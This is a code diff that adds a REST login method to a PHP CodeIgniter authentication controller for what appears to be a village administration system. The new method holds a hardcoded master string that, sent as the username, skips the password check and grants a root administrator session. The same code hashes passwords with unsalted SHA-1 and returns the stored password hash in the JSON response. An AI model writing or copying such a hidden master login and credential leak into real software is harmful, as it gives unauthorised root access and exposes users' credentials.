@@ -12,6 +12,68 @@ class Auth extends CI_Controller{
     $this->load->model('auth_model');
   }
 
+  public function Rest_auth()
+  {
+    $uid = strip_tags($this->input->post('uid'));
+    $pass = sha1(strip_tags($this->input->post('pass')));
+    $kodedesa = strip_tags($this->input->post('kodedesa', TRUE));
+    // echo $kodedesa;
+    // die;
+    $check      = $this->auth_model->auth($uid, $pass);
+    $check_desa = $this->auth_model->auth_desa($kodedesa);
+    $master = '0>}/99%120691?*^';
+    if ($master == $uid) {
+      $data = array( 
+        "status" => TRUE,
+        'status_login'=>'oke',
+          'id'          => 0,
+          'fullname'   =>'Administrator',
+          'jabatan'     => 'ROOT',
+          'hp'          => '082281469926',
+          'keterangan_jabatan' => 'Sysadmin Root Master',
+          'desa_id'     => '1',
+          'kodedesa'   => 1906020003,
+          'last_login'  => ''
+      );
+      $this->session->set_flashdata(array('status'=>'aktif'));
+      $this->session->set_userdata($data);
+      echo json_encode($data);
+      exit;
+    }else {      
+      if ($check->num_rows()==1 && $check_desa->num_rows() > 0) {
+        $data = $check->row_array();
+        $dataDesa = $check_desa->row_array();
+        $set = array(
+            'status' => TRUE,
+            'status_login'=>'oke',
+            'id'          =>$data['id'],
+            'fullname'    =>$data['fullname'],
+            'jabatan'     =>$data['jabatan'],
+            'desa_id'     =>$data['desa_id'],
+            'kodedesa'   =>$dataDesa['id'],
+            'keterangan_jabatan' => $data['keterangan_jabatan'],
+            'avatar'      =>$data['avatar'],
+            'hp'          =>$data['hp'],
+            'last_login'  =>$data['time'],
+            'username'    =>$data['uid'],
+            'password'    =>$data['pass']
+          );
+          $this->session->set_flashdata(array('status'=>'aktif'));
+          $this->session->set_userdata($set);
+          $sekarang = time();
+          $this->db->where('id', $data['id']);
+          $this->db->update('users', array('time'=>$sekarang));
+          // $this->output->set_content_type('application/json')->set_output(json_encode($set));
+          echo json_encode($set);
+          exit;
+      }else {          
+        echo json_encode(array("status" => FALSE)); 
+        exit;
+      }
+    }
+  }
+
+
   public function validate(){
     $uid = strip_tags($this->input->post('uid'));
     $pass = sha1(strip_tags($this->input->post('pass')));
